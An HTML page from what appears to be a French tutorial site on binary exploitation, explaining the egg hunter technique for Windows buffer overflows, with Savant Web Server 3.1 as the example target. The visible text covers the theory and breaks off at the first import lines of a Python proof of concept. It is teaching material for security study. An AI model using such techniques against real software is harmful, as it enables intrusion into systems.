
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Bring you offensive spirit to the next level">
      
      
      
        <link rel="canonical" href="https://s-lck.github.io/HolisticPwning/binary-exploitation/3-egghunters/">
      
      
        <link rel="prev" href="../2-seh-overflow/">
      
      
        <link rel="next" href="../../write-up/NSEC24_Photographic-Memory-System/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.14">
    
    
      
        <title>Egg Hunters - Holistic Pwning</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.342714a4.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../custom.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
      
        <meta  property="og:type"  content="website" >
      
        <meta  property="og:title"  content="Egg Hunters - Holistic Pwning" >
      
        <meta  property="og:description"  content="Bring you offensive spirit to the next level" >
      
        <meta  property="og:image"  content="https://s-lck.github.io/HolisticPwning/assets/images/social/binary-exploitation/3-egghunters.png" >
      
        <meta  property="og:image:type"  content="image/png" >
      
        <meta  property="og:image:width"  content="1200" >
      
        <meta  property="og:image:height"  content="630" >
      
        <meta  property="og:url"  content="https://s-lck.github.io/HolisticPwning/binary-exploitation/3-egghunters/" >
      
        <meta  name="twitter:card"  content="summary_large_image" >
      
        <meta  name="twitter:title"  content="Egg Hunters - Holistic Pwning" >
      
        <meta  name="twitter:description"  content="Bring you offensive spirit to the next level" >
      
        <meta  name="twitter:image"  content="https://s-lck.github.io/HolisticPwning/assets/images/social/binary-exploitation/3-egghunters.png" >
      
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="brown" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#egg-hunters" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Holistic Pwning" class="md-header__button md-logo" aria-label="Holistic Pwning" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Holistic Pwning
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Egg Hunters
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="brown" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="brown" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/s-lck/HolisticPwning" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Holistic Pwning" class="md-nav__button md-logo" aria-label="Holistic Pwning" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    Holistic Pwning
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/s-lck/HolisticPwning" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Holistic Pwning
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Binary exploitation
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Binary exploitation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../0-architecture-x86/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Architecture et debugger
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../1-stack-overflow/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Stack Overflow
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../2-seh-overflow/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SEH Overflow
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Egg Hunters
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Egg Hunters
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#theorie" class="md-nav__link">
    <span class="md-ellipsis">
      Théorie
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pratique" class="md-nav__link">
    <span class="md-ellipsis">
      Pratique
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Pratique">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#valider-lexploit" class="md-nav__link">
    <span class="md-ellipsis">
      Valider l'exploit
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#identifier-les-mauvais-caracteres" class="md-nav__link">
    <span class="md-ellipsis">
      Identifier les mauvais caractères
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#determiner-loffset-exact" class="md-nav__link">
    <span class="md-ellipsis">
      Déterminer l'offset exact
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reecriture-partielle-de-eip" class="md-nav__link">
    <span class="md-ellipsis">
      Réécriture partielle de EIP
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Réécriture partielle de EIP">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#modification-de-la-methode-http" class="md-nav__link">
    <span class="md-ellipsis">
      Modification de la méthode HTTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sauts-conditionnels" class="md-nav__link">
    <span class="md-ellipsis">
      Sauts conditionnels
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#trouver-de-lespace-supplementaire" class="md-nav__link">
    <span class="md-ellipsis">
      Trouver de l'espace supplémentaire
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Trouver de l&#39;espace supplémentaire">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#gestionnaire-de-tas-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Gestionnaire de Tas Windows
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#lapproche-egg-hunter" class="md-nav__link">
    <span class="md-ellipsis">
      L'approche Egg Hunter
    </span>
  </a>
  
    <nav class="md-nav" aria-label="L&#39;approche Egg Hunter">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#keystone-engine" class="md-nav__link">
    <span class="md-ellipsis">
      Keystone Engine
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#egghunters-et-appels-systeme" class="md-nav__link">
    <span class="md-ellipsis">
      Egghunters et appels système
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#corriger-lexploit" class="md-nav__link">
    <span class="md-ellipsis">
      Corriger l'exploit
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#recuperer-un-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Récupérer un shell
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ameliorer-la-portabilite-du-egghunter-en-utilisant-seh-tbd" class="md-nav__link">
    <span class="md-ellipsis">
      Améliorer la portabilité du Egghunter en utilisant SEH [TbD]
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Write up
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Write up
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../write-up/NSEC24_Photographic-Memory-System/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NSEC24 : Photographic Memory System
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../write-up/NSEC25_Fuel-Management-System/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NSEC25 : Fuel Management System
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#theorie" class="md-nav__link">
    <span class="md-ellipsis">
      Théorie
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pratique" class="md-nav__link">
    <span class="md-ellipsis">
      Pratique
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Pratique">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#valider-lexploit" class="md-nav__link">
    <span class="md-ellipsis">
      Valider l'exploit
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#identifier-les-mauvais-caracteres" class="md-nav__link">
    <span class="md-ellipsis">
      Identifier les mauvais caractères
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#determiner-loffset-exact" class="md-nav__link">
    <span class="md-ellipsis">
      Déterminer l'offset exact
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reecriture-partielle-de-eip" class="md-nav__link">
    <span class="md-ellipsis">
      Réécriture partielle de EIP
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Réécriture partielle de EIP">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#modification-de-la-methode-http" class="md-nav__link">
    <span class="md-ellipsis">
      Modification de la méthode HTTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sauts-conditionnels" class="md-nav__link">
    <span class="md-ellipsis">
      Sauts conditionnels
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#trouver-de-lespace-supplementaire" class="md-nav__link">
    <span class="md-ellipsis">
      Trouver de l'espace supplémentaire
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Trouver de l&#39;espace supplémentaire">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#gestionnaire-de-tas-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Gestionnaire de Tas Windows
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#lapproche-egg-hunter" class="md-nav__link">
    <span class="md-ellipsis">
      L'approche Egg Hunter
    </span>
  </a>
  
    <nav class="md-nav" aria-label="L&#39;approche Egg Hunter">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#keystone-engine" class="md-nav__link">
    <span class="md-ellipsis">
      Keystone Engine
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#egghunters-et-appels-systeme" class="md-nav__link">
    <span class="md-ellipsis">
      Egghunters et appels système
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#corriger-lexploit" class="md-nav__link">
    <span class="md-ellipsis">
      Corriger l'exploit
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#recuperer-un-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Récupérer un shell
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ameliorer-la-portabilite-du-egghunter-en-utilisant-seh-tbd" class="md-nav__link">
    <span class="md-ellipsis">
      Améliorer la portabilité du Egghunter en utilisant SEH [TbD]
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  
  


<h1 id="egg-hunters">Egg Hunters</h1>
<div class="admonition note">
<p>Dans certains cas d'exploitation de dépassement de tampon, seul un espace mémoire restreint n'est rendu disponible rendant difficile le stockage du <em>payload</em>. La technique de <em>egghunter</em> a pour objectif d'identifier des zones propices au stockage du <em>payload</em>.</p>
</div>
<h2 id="theorie">Théorie</h2>
<p>Dans le cas où l'espace du payload est limité, il existe deux options :</p>
<ul>
<li>Utiliser un shellcode plus petit avec moins de fonctionnalité</li>
<li>Trouver un buffer additionnel dans une autre région de la mémoire avant le crash et de rediriger le flot d'exécution vers ce buffer</li>
</ul>
<p>Si on arrive à stocker un <em>buffer</em> plus large ailleurs on peut utiliser le premier <em>buffer</em> pour écrire un <em>shellcode</em> de type <em>first-stage</em>. L'objectif de ce <em>shellcode</em> sera de rediriger le flot d'exécution vers le deuxième buffer ou on aura assez de place pour stocker un <em>payload</em> plus large.</p>
<p>Quand on doit trouver l'adresse mémoire d'un autre <em>buffer</em> sous notre contrôle dont l'adresse n'est pas statique on utilise des <em>egghunter</em>.</p>
<ul>
<li>Un <em>egghunter</em> est un payload <em>first-stage</em> qui permet de chercher le <code>Virtual Address Space</code> (VAS) du processus à la recherche d'un <em>egg</em></li>
<li>Un <em>egg</em> est un tag unique qui précède le payload qu'on veut exécuter</li>
<li>Une fois le <em>egg</em> trouvé le <em>egghunter</em> transfert l'exécution vers le shellcode final en faisant un jump vers l'adresse trouvée</li>
</ul>
<p>Les <em>egghunter</em> sont écrits dans le cas de problème de restriction mémoire et sont donc aussi petits que possible :</p>
<ul>
<li>Ils doivent aussi être rapides à s'exécuter et à trouver le <em>egg</em> pour éviter de <em>hang</em> l'application trop longtemps</li>
<li>Ces payloads doivent aussi gérer les <em>access violations</em> déclenchés lors de l'accès à de la mémoire non mappée ou d'adresse à laquelle on a pas accès</li>
</ul>
<h2 id="pratique">Pratique</h2>
<p>L'exemple utilisé sera l'exploit portant sur l'application <a href="https://www.exploit-db.com/exploits/38079">`Savant Web Server 3.1</a>.</p>
<h3 id="valider-lexploit">Valider l'exploit</h3>
<p>Preuve de concept en Python :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
